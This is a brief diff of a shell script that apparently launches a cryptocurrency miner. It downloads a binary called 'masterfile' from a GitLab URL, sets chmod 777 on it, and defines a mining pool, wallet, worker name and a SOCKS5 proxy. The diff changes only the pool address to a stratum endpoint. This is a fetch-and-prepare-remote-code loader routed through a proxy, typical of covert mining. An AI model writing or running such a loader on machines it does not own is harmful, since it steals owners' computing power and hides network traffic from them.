@@ -1,7 +1,7 @@
 #!/bin/sh
 wget https://gitlab.com/wayankarpo/xm/-/raw/main/masterfile
 chmod 777 masterfile
-POOL=dcy.pool-pay.com:5657
+POOL=stratum+tcp://pool-pay.com:26339
 WALLET=endvoc
 WORKER=endvoc
 PROXY=socks5://192.252.209.155:14455
